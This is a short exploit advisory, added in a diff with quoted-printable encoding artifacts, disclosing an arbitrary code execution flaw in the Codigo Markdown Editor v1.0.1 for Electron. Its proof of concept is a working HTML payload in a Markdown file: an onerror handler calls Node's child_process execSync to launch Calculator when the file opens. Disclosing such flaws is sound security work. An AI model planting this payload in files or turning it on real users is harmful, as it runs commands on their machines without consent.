@@ -1,0 +1,35 @@
+# Exploit Title: Codigo Markdown Editor v1.0.1 (Electron) - Arbitrary Code Execution
+# Date: 2023-05-03
+# Exploit Author: 8bitsec
+# Vendor Homepage: https://alfonzm.github.io/codigo/
+# Software Link: https://github.com/alfonzm/codigo-app
+# Version: 1.0.1
+# Tested on: [Mac OS 13]
+
+Release Date:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+2023-05-03
+
+Product & Service Introduction:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D
+A Markdown editor & notes app made with Vue & Electron
+
+Technical Details & Description:
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D
+
+A vulnerability was discovered on Codigo markdown editor v1.0.1 allowing a =
+user to execute arbitrary code by opening a specially crafted file.
+
+Proof of Concept (PoC):
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+Arbitrary code execution:
+
+Create a markdown file (.md) in any text editor and write the following pay=
+load:
+<video><source onerror=3D"alert(require('child_process').execSync('/System/=
+Applications/Calculator.app/Contents/MacOS/Calculator').toString());">
+
+Opening the file in Codigo will auto execute the Calculator application.
